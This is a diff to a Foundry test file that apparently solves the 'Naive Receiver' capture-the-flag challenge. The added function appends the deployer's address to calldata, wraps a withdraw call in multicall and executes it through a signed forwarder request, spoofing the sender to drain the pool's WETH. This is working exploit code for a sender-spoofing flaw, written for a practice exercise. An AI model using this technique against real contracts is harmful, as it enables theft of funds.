@@ -154,7 +154,7 @@ console.log("");
     
     // NOTE: builds callData that encodes multicall invocation for the pool contract
     bytes memory callData; 
-    callData = abi.encodeCall(pool.multicall, callDatas);
+    callData = abi.encodeCall(pool.multicall, callDatas); // ===============
 
     // LOG: inspect the multicall encoded bytes
     console.log("=== multicall callData ===");
@@ -255,6 +255,70 @@ console.log("recovery weth:", postRecovery);
 // print deltas to make it easy to read
 
     }
+
+function _lessIteration() public {
+// --- build a single withdraw call and append deployer as last 20 bytes ---
+bytes[] memory calls = new bytes[](1);
+
+
+// amount to withdraw: use pool WETH balance (deployer deposited pool initial funds)
+uint256 depositAmount = weth.balanceOf(address(pool));
+
+// append exact 20 bytes (address) — this ensures calldata ends with those 20 bytes
+calls[0] = abi.encodePacked(
+    abi.encodeCall(NaiveReceiverPool.withdraw, (depositAmount, payable(recovery))),
+    bytes20(deployer) // <<< append exactly 20 bytes (no 12-byte padding)
+);
+
+// encode multicall calldata
+bytes memory callData = abi.encodeCall(pool.multicall, (calls));
+
+// DEBUG: show last 32 bytes of callData
+bytes32 lastWord;
+uint256 len = callData.length;
+assembly { lastWord := mload(add(add(callData, 32), sub(len, 32))) }
+console.log("last 32 bytes (hex):"); console.logBytes32(lastWord);
+
+// CORRECT extraction of the last 20 bytes as an address:
+// - load 32 bytes starting at the beginning of the last-20 slice
+// - the 20 bytes occupy the *most significant* 20 bytes of that loaded word,
+//   so we shift right by 12 bytes (96 bits) to move them to low-order position.
+bytes20 last20;
+assembly {
+    let start := add(callData, add(32, sub(len, 20))) // pointer to first byte of last 20 bytes
+    last20 := shr(96, mload(start)) // shift right by 12 bytes (96 bits)
+}
+console.log("last20 (as address):"); console.logAddress(address(last20));
+console.log("expected deployer:", deployer);
+
+// ... build forwarder request, sign and execute as before
+BasicForwarder.Request memory request = BasicForwarder.Request(
+    player,
+    address(pool),
+    0,
+    gasleft(),
+    forwarder.nonces(player),
+    callData,
+    1 days
+);
+
+bytes32 requestHash = keccak256(
+    abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request))
+);
+(uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
+bytes memory signature = abi.encodePacked(r, s, v);
+
+forwarder.execute(request, signature);
+
+console.log("after forwarder execute: pool:", weth.balanceOf(address(pool)), "recovery:", weth.balanceOf(recovery));
+
+
+}
+
+function test_lessIteration() public {
+    _lessIteration();
+}
+
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
      */
